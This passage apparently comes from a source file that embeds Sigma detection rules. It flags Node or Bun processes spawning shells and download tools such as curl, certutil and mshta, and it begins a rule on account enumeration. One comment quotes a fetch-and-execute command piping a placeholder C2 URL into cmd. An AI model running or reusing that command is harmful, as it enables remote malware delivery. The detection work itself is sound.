logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ParentImage|endswith:
            - 'node.exe'
            - 'bun.exe'
        Image|endswith:
            - 'cmd.exe' # interactive shell https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce; https://www.elastic.co/security-labs/contagious-interview-malware-svg-steganography; https://asec.ahnlab.com/en/95516/
            - 'powershell.exe' # interactive shell https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce; https://www.microsoft.com/en-us/security/blog/2026/03/11/contagious-interview-malware-delivered-through-fake-developer-job-interviews/; https://blackpointcyber.com/blog/chainscript-tracing-a-nodejs-rat-across-the-blockchain/
            - 'wscript.exe'
            - 'cscript.exe' #https://socket.dev/blog/axios-npm-package-compromised
            - 'curl.exe' # malware download https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce; curl -s https://<C2>/api/w | cmd
            - 'bitsadmin.exe'
            - 'certutil.exe'
            - 'mshta.exe'
    selection_vars:
        - Image|contains|all:
            - '\python'
            - '.exe'
        - CommandLine|contains|all:
            - 'reg'
            - ' add '
        - CommandLine|contains|all:
            - 'wmic'
            - ' create '
        - CommandLine|contains:
            - 'wscript'
            - 'cscript'
            - 'wget '
            - 'wget.exe'
            - 'schtasks'
            - 'curl'
            - 'bitsadmin'
            - 'forfiles'
            - 'hh.exe'
            - 'msbuild'
            - 'mshta'
            - 'regasm'
            - 'regsvcs'
            - 'runonce'
            - 'msiexec'
            - 'regsvr32'
            - 'cmd'
    filters:
        - CommandLine|contains|all:
            - 'Adobe'
            - 'CCXProcess'
        - CommandLine|contains|all:
            - 'git'
            - 'config'
        - CommandLine|contains|all:
            - 'taskkill'
            - '/pid'
        #CommandLine|contains|all:
        #    - '\Program Files'
        #    - 'schtasks'
    condition: (selection and selection_vars) and not filters
falsepositives:
    - It is highly recommended to baseline your activity and tune out common business use cases.
level: medium
"#,
  // Possible Account or Group Enumeration / Manipulation (via cmdline)
  "8a701e5f-a0a6-4f58-9a35-1f29a08e4f79": r#"title: Possible Account or Group Enumeration / Manipulation (via cmdline)
id: 8a701e5f-a0a6-4f58-9a35-1f29a08e4f79
status: stable
description: Adversaries may attempt to get a listing/permissions and other info of local system or domain accounts. The reliance on the surrounding environment may necessitate the implementation of additional filtering measures to prevent false positives. It is highly recommended to baseline your activity and tune out common business use cases.
author: SOC Prime Team
